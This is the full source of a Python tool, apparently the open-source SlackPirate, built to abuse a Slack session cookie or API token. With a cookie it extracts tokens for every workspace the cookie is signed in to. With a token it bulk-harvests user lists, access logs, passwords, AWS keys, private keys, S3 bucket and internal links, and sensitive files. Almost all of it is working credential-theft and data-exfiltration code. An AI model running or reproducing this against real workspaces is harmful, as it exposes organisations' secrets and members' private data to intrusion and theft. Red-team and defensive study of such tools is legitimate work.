#!/usr/bin/env python3

import argparse
import json
import pathlib
import re
import time
import colorama
import requests
import termcolor
#############
# Constants #
#############
# Query params
MAX_RETRIEVAL_COUNT = 900
# User agent strings
BROWSER_USER_AGENT = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/71.0.3578.98 Safari/537.36'}
SLACK_USER_AGENT = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0.17134; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'AtomShell/3.3.3 Chrome/61.0.3163.100 Electron/2.0.7 Safari/537.36 Slack_SSB/3.3.3'}

# Output file names
FILE_USER_LIST = "user-list.json"
FILE_ACCESS_LOGS = "access-logs.json"
FILE_S3 = "S3.txt"
FILE_CREDENTIALS = "Passwords.txt"
FILE_AWS_KEYS = "aws-keys.txt"
FILE_PRIVATE_KEYS = "private-keys.txt"
FILE_LINKS = "URLs.txt"

# Query pieces
S3_QUERIES = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
CREDENTIALS_QUERIES = ["password:", "password is", "pwd", "passwd"]
AWS_KEYS_QUERIES = ["ASIA*", "AKIA*"]
PRIVATE_KEYS_QUERIES = ["BEGIN DSA PRIVATE",
                        "BEGIN EC PRIVATE",
                        "BEGIN OPENSSH PRIVATE",
                        "BEGIN PGP PRIVATE",
                        "BEGIN RSA PRIVATE"]
INTERESTING_FILE_QUERIES = [".doc",
                            ".docx",
                            ".key",
                            ".p12",
                            ".pem",
                            ".pfx",
                            ".pkcs12",
                            ".ppk",
                            ".sh",
                            ".sql",
                            "backup",
                            "password",
                            "secret"]
LINKS_QUERIES = ["amazonaws",
                 "atlassian",
                 "beta",
                 "confluence",
                 "docs.google.com",
                 "github",
                 "internal",
                 "jenkins",
                 "jira",
                 "kubernetes",
                 "sharepoint",
                 "staging",
                 "travis",
                 "trello"]
# Regex constants with explanatory links
# https://regex101.com/r/9GRaem/1
ALREADY_SIGNED_IN_TEAM_REGEX = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"
# https://regex101.com/r/2Hz8AX/1
SLACK_API_TOKEN_REGEX = r"api_token: \"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""
# https://regex101.com/r/cSZW0G/1
WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
# https://regex101.com/r/jWrF8F/2
PRIVATE_KEYS_REGEX = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"
# https://regex101.com/r/6bLaKj/8
S3_REGEX = r"(" \
           r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com" \
           r"|s3://[a-zA-Z0-9-\.\_]+" \
           r"|s3-[a-zA-Z0-9-\.\_\/]+" \
           r"|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+" \
           r"|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"
# https://regex101.com/r/DoPV1M/1
CREDENTIALS_REGEX = r"(?i)(" \
                    r"password\s*[`=:\"]+\s*[^\s]+" \
                    r"|password is\s*[`=:\"]+\s*[^\s]+" \
                    r"|pwd\s*[`=:\"]+\s*[^\s]+" \
                    r"|passwd\s*[`=:\"]+\s*[^\s]+)"
# https://regex101.com/r/IEq5nU/4
AWS_KEYS_REGEX = r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"
# https://regex101.com/r/SU43wh/1
# Top-level domain capture group
TLD_GROUP = r"(?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int" \
            r"|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae" \
            r"|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd" \
            r"|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc" \
            r"|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd" \
            r"|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm" \
            r"|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt" \
            r"|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is" \
            r"|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb" \
            r"|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm" \
            r"|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng" \
            r"|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr" \
            r"|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si" \
            r"|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf" \
            r"|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us" \
            r"|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)"
LINKS_REGEX = r"(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.]" + TLD_GROUP + \
              r"/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)" \
              r"|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)" \
              r"|\([^\s]+?\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’])" \
              r"|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.]" + TLD_GROUP + r"\b/?(?!@)))"

# Data Classes


class OutputInformation:
    """
    Collects the output directory and workspace name for use in writing output.
    """
    def __init__(self, output_directory: str, slack_workspace: str):
        self.output_directory = output_directory
        self.slack_workspace = slack_workspace


# Module functionality
def is_rate_limited(slack_api_json_response):
    """
    All this function does is check if the response tells us we're being rate-limited. If it is, sleep for
    60 seconds then continue. Previously I was proactively sleeping for 60 seconds before the documented rate-limit
    kicked in but then learned not to trust the docs as they weren't trustworthy (the actual rate-limit is
    more lenient then what they have documented which is a good thing for us but meant that a proactive rate-limit
    would sleep prematurely)
    """
    if slack_api_json_response['ok'] is False and slack_api_json_response['error'] == 'ratelimited':
        print(termcolor.colored("INFO: Slack API rate limit hit - sleeping for 60 seconds", "white", "on_blue"))
        time.sleep(60)
    else:
        return


def display_cookie_tokens(cookie):
    """
    If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
    then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
    RegEx out the api_token and print it to stdout. Hmm, as I write this comment I wonder if it would be a good idea
    to write the tokens to a file... maybe, maybe not. Probably not ideal to commit a bunch of corporate
    tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...
    """
    try:
        r = requests.get("https://slackpirate.slack.com", cookies=cookie, headers=BROWSER_USER_AGENT)
        already_signed_in_match = re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content))
        if already_signed_in_match:
            print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
            for workspace in already_signed_in_match:
                r = requests.get(workspace, cookies=cookie, headers=BROWSER_USER_AGENT)
                regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                for slack_token in regex_tokens:
                    print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "white", "on_green"))
        else:
            print(termcolor.colored("No workspaces were found for this cookie", "white", "on_red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    exit()


def check_token_validity(token) -> OutputInformation:
    # Use the Slack auth.test API to check whether the token is valid or not. If token is valid then create a
    # directory for results to go in - easy peasy.
    result = None
    try:
        r = requests.post("https://slack.com/api/auth.test", params=dict(token=token, pretty=1),
                          headers={'Authorization': 'Bearer ' + token, **SLACK_USER_AGENT}).json()
        if str(r['ok']) == 'True':
            result = OutputInformation(output_directory=str(r['team']), slack_workspace=str(r['url']))
            print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']),
                                    "white", "on_blue"))
            print(termcolor.colored("\n"))
            pathlib.Path(result.output_directory).mkdir(parents=True, exist_ok=True)
        else:
            print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "white", "on_red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    return result


def print_interesting_information(output_info: OutputInformation):
    """
    I wonder how many people know that Slack advertise the @domains that can be used to register for the Workspace?
    I've seen organizations leave old/expired/stale domains in here which can then be used by attackers to gain access
    """

    try:
        r = requests.get(output_info.slack_workspace, headers=SLACK_USER_AGENT)
        team_domains_match = re.findall(WORKSPACE_VALID_EMAILS_REGEX, str(r.content))
        for domain in team_domains_match:
            print(
                termcolor.colored("INFO: The following domains can be used on this Slack Workspace: " + domain,
                                  "white", "on_blue"))
            print(termcolor.colored("\n"))
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))


def dump_team_access_logs(token, output_info: OutputInformation):
    """
    You need the token of an elevated user (lucky you!) and the Workspace must be a paid one - i.e., not a free one
    The information here can be useful but I wouldn't fret about it - the other data is far more interesting
    """

    print(termcolor.colored("START: Attempting download Workspace access logs", "white", "on_blue"))
    try:
        r = requests.get("https://slack.com/api/team.accessLogs",
                         params=dict(token=token, pretty=1, count=MAX_RETRIEVAL_COUNT),
                         headers=SLACK_USER_AGENT).json()
        is_rate_limited(r)
        if str(r['ok']) == 'True':
            for value in r['logins']:
                with open(output_info.output_directory + '/' + FILE_ACCESS_LOGS, 'a', encoding="utf-8") as outfile:
                    json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=False)
        else:
            print(termcolor.colored(
                "END: Unable to dump access logs (this is normal if you don't have a privileged token on a non-free "
                "Workspace). Slack error: " + str(r['error']), "white", "on_blue"))
            print(termcolor.colored("\n"))
            return
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(termcolor.colored(
        "END: Successfully dumped access logs! Filename: ./" + output_info.output_directory + "/" + FILE_ACCESS_LOGS,
        "white", "on_green"))
    print(termcolor.colored("\n"))


def dump_user_list(token, output_info: OutputInformation):
    """
    In case you're wondering (hello fellow nerd/future me), the reason for limit=900 is because what Slack says:
    `To begin pagination, specify a limit value under 1000. We recommend no more than 200 results at a time.`
    Feel free to ignore the bit about what *they* recommend :-)
    In theory, we can strip out the limit parameter completely and Slack will return the entire dataset *BUT* they say
    this: `If the collection is too large you may experience HTTP 500 errors.` and more importantly:
    `One day pagination will become required to use this method.`
    """

    print(termcolor.colored("START: Attempting to download Workspace user list", "white", "on_blue"))
    pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
    try:
        r = requests.get("https://slack.com/api/users.list",
                         params=dict(token=token, pretty=1, limit=1, cursor=pagination_cursor),
                         headers=SLACK_USER_AGENT).json()
        is_rate_limited(r)
        if str(r['ok']) == 'False':
            print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']), "yellow"))
            print(termcolor.colored("\n"))
        else:
            pagination_cursor = r['response_metadata']['next_cursor']
            while str(r['ok']) == 'True' and pagination_cursor:
                request_url = "https://slack.com/api/users.list"
                params = dict(token=token, pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor)
                r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
                for value in r['members']:
                    pagination_cursor = r['response_metadata']['next_cursor']
                    with open(output_info.output_directory + '/' + FILE_USER_LIST, 'a', encoding="utf-8") as outfile:
                        json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=True)
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(
        termcolor.colored("END: Successfully dumped user list! Filename: ./" + output_info.output_directory +
                          "/" + FILE_USER_LIST,
                          "white", "on_green"))
    print(termcolor.colored("\n"))


def find_s3(token, output_info: OutputInformation):
    print(termcolor.colored("START: Attempting to find references to S3 buckets", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in S3_QUERIES:
            r = requests.get("https://slack.com/api/search.messages",
                             params=dict(token=token, query="\"{}\"".format(query), pretty=1, count=100),
                             headers=SLACK_USER_AGENT).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
                r = requests.get("https://slack.com/api/search.messages",
                                 params=params,
                                 headers=SLACK_USER_AGENT).json()
                regex_results = re.findall(S3_REGEX, str(r))
                with open(output_info.output_directory + '/' + FILE_S3, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
        print(termcolor.colored("\n"))
    file_cleanup(input_file=FILE_S3, output_info=output_info)
    print(
        termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + output_info.output_directory +
                          "/" + FILE_S3, "white", "on_green"))
    print(termcolor.colored("\n"))


def find_credentials(token, output_info: OutputInformation):
    print(termcolor.colored("START: Attempting to find references to credentials", "white", "on_blue"))
    pagination = dict()

    try:
        r = None
        for query in CREDENTIALS_QUERIES:
            params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
            r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers=SLACK_USER_AGENT).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
                regex_results = re.findall(CREDENTIALS_REGEX, str(r))
                with open(output_info.output_directory + '/' + FILE_CREDENTIALS, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(input_file=FILE_CREDENTIALS, output_info=output_info)
    print(termcolor.colored(
        "END: If any credentials were found, they will be here: ./" + output_info.output_directory +
        "/" + FILE_CREDENTIALS,
        "white", "on_green"))
    print(termcolor.colored("\n"))


def find_aws_keys(token, output_info: OutputInformation):
    print(termcolor.colored("START: Attempting to find references to AWS keys", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in AWS_KEYS_QUERIES:
            params = dict(token=token, query=query, pretty=1, count=100)
            r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers=SLACK_USER_AGENT).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query=key, pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
                regex_results = re.findall(AWS_KEYS_REGEX, str(r))
                with open(output_info.output_directory + '/' + FILE_AWS_KEYS, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(input_file=FILE_AWS_KEYS, output_info=output_info)
    print(termcolor.colored(
        "END: If any AWS keys were found, they will be here: ./" + output_info.output_directory +
        "/" + FILE_AWS_KEYS, "white", "on_green"))
    print(termcolor.colored("\n"))


def find_private_keys(token, output_info: OutputInformation):
    """
    Searching for private keys by using certain keywords. Slack returns the actual string '\n' in the response so
    we're replacing the string with an actual \n new line :-)
    """

    print(termcolor.colored("START: Attempting to find references to private keys", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in PRIVATE_KEYS_QUERIES:
            params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
            r = requests.get("https://slack.com/api/search.messages",
                             params=params,
                             headers=SLACK_USER_AGENT).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
                regex_results = re.findall(PRIVATE_KEYS_REGEX, str(r))
                remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                with open(output_info.output_directory + '/' + FILE_PRIVATE_KEYS, 'a', encoding="utf-8") as log_output:
                    for item in set(remove_new_line_char):
                        log_output.write(item + "\n\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))

    print(termcolor.colored(
        "END: If any private keys were found, they will be here: ./" + output_info.output_directory +
        "/" + FILE_PRIVATE_KEYS, "white", "on_green"))
    print(termcolor.colored("\n"))


def find_interesting_links(token, output_info: OutputInformation):
    """
    Does a search for URI/URLs by searching for keywords such as 'amazonaws', 'jenkins', etc.
    We're using the special Slack search 'has:link' here.
    """

    print(termcolor.colored("START: Attempting to find references to interesting URLs", "white", "on_blue"))
    pagination = {}

    try:
        r = None
        for query in LINKS_QUERIES:
            request_url = "https://slack.com/api/search.messages"
            params = dict(token=token, query="has:link {}".format(query), pretty=1, count=100)
            r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                request_url = "https://slack.com/api/search.messages"
                params = dict(token=token, query="has:link {}".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
                regex_results = re.findall(LINKS_REGEX, str(r))
                with open(output_info.output_directory + '/' + FILE_LINKS, 'a', encoding="utf-8") as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    file_cleanup(input_file=FILE_LINKS, output_info=output_info)
    print(termcolor.colored("END: If any URLs were found, they will be here: ./" + output_info.output_directory +
                            "/" + FILE_LINKS, "white", "on_green"))
    print(termcolor.colored("\n"))


def download_interesting_files(token, output_info: OutputInformation):
    """
    Downloads files which may be interesting to an attacker. Searches for certain keywords then downloads.
    bad_characters is used to strip out characters which though accepted in Slack, aren't accepted in Windows
    """

    print(termcolor.colored("START: Attempting to download interesting files (this may take some time)", "white",
                            "on_blue"))
    pathlib.Path(output_info.output_directory + '/downloads').mkdir(parents=True, exist_ok=True)
    bad_characters = "/\\:*?\"<>|"  # Windows doesn't like these characters. Guess how I found out.
    strip_bad_characters = str.maketrans(bad_characters, '_________')  # Replace bad characters with an underscore
    pagination = {}

    try:
        for query in INTERESTING_FILE_QUERIES:
            request_url = "https://slack.com/api/search.files"
            params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
            r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
            is_rate_limited(r)
            pagination[query] = (r['files']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                request_url = "https://slack.com/api/search.files"
                params = dict(token=token, query="\"{}\"".format(key), pretty=1, count=100, page=str(page))
                r = requests.get(request_url, params=params, headers=SLACK_USER_AGENT).json()
                is_rate_limited(r)
                for file in r['files']['matches']:
                    file_name = file['name']
                    r = requests.get(file['url_private'], headers={'Authorization': 'Bearer ' + token, **SLACK_USER_AGENT})
                    open(output_info.output_directory + '/downloads/' + ' ' + file_name.translate(
                        strip_bad_characters), 'wb').write(r.content)
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "white", "on_red"))
    print(
        termcolor.colored(
            "END: Downloaded files (if any were found) will be found in: ./" +
            output_info.output_directory + "/downloads", "white", "on_green"))
    print(termcolor.colored("\n"))


def file_cleanup(input_file, output_info: OutputInformation):
    """
    these few lines of sweetness do two things: (1) de-duplicate the content by using Python Sets and
    (2) remove lines containing "com/archives/" <-- this is found in a lot of the  responses and isn't very useful
    """

    reference_file = pathlib.Path(output_info.output_directory + '/' + input_file)
    if reference_file.is_file():
        with open(str(reference_file), 'r', encoding="utf-8") as file:
            lines = set(file.readlines())
        with open(str(reference_file), 'w+', encoding="utf-8") as file:
            for line in sorted(lines, key=str.lower):
                if "com/archives/" not in line:
                    file.write(line)
    else:
        return


if __name__ == '__main__':
    # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise
    colorama.init()

    parser = argparse.ArgumentParser(description="This is a tool developed in Python which uses the native Slack APIs "
                                                 "to extract 'interesting' information from Slack Workspaces.")
    parser.add_argument('--cookie', type=str, required=False,
                        help='Slack \'d\' cookie. This flag will instruct the tool'
                             ' to search for Workspaces associated with the cookie.'
                             ' Results along with tokens will be printed to stdout')
    parser.add_argument('--token', type=str, required=False,
                        help='Slack Workspace token. The token should start with XOX.')
    parser.add_argument('--no-team-access-logs', action='store_true', help='skips dumping of team access logs')
    parser.add_argument('--no-user-list', action='store_true', help='skips retrieval of user list')
    parser.add_argument('--no-s3-scan', action='store_true', help='skips searching for s3 references in messages')
    parser.add_argument('--no-credential-scan', action='store_true',
                        help='skips searching for messages referencing credentials')
    parser.add_argument('--no-aws-key-scan', action='store_true', help='skips search for aws keys in messages')
    parser.add_argument('--no-private-key-scan', action='store_true', help='skips search for private keys in messages')
    parser.add_argument('--no-link-scan', action='store_true', help='skips searching for interesting links')
    parser.add_argument('--no-file-download', action='store_true', help='skips downloading of files from the workspace')
    parser.add_argument('--version', action='version',
                        version='SlackPirate.py v0.2. Developed by Mikail Tunç (@emtunc) with contributions from '
                                'the amazing community! https://github.com/emtunc/SlackPirate/graphs/contributors')
    args = parser.parse_args()

    if args.cookie is None and args.token is None:  # Must provide one or the other
        print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "white", "on_red"))
        exit()
    elif args.cookie and args.token:  # May not provide both
        print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "white", "on_red"))
        exit()
    elif args.cookie:  # Providing a cookie leads to a shorter execution path
        display_cookie_tokens(cookie=dict(d=args.cookie))
        exit()
    # Baseline behavior
    provided_token = args.token
    collected_output_info = check_token_validity(token=provided_token)
    print_interesting_information(output_info=collected_output_info)

    # Possible scans to run along with flags that disable them
    flags_and_scans = [
        ('no_team_access_log', dump_team_access_logs),
        ('no_user_list', dump_user_list),
        ('no_s3_scan', find_s3),
        ('no_credential_scan', find_credentials),
        ('no_aws_key_scan', find_aws_keys),
        ('no_private_key_scan', find_private_keys),
        ('no_link_scan', find_interesting_links),
        ('no_file_download', download_interesting_files),

    ]

    args_as_dict = vars(args)  # Using a dict makes the flags easier to check
    for flag, scan in flags_and_scans:
        if not args_as_dict.get(flag, None):
            scan(token=provided_token, output_info=collected_output_info)
